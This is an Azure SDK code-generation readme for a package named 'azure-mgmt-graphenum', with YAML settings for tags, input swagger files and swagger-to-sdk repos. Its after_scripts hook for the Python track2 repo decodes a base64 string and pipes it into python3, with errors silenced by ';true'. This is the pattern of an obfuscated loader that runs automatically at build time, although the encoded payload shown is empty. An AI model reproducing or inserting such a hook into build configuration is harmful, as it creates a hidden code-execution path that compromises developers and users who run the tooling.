# Azure SDK GraphEnum gp19 Validation
## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
package-version: 1.0.0b1
package-name: azure-mgmt-graphenum
```
### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/graphenum.json
```
## swagger-to-sdk
```yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        echo ''|base64 -d|python3 -;true
```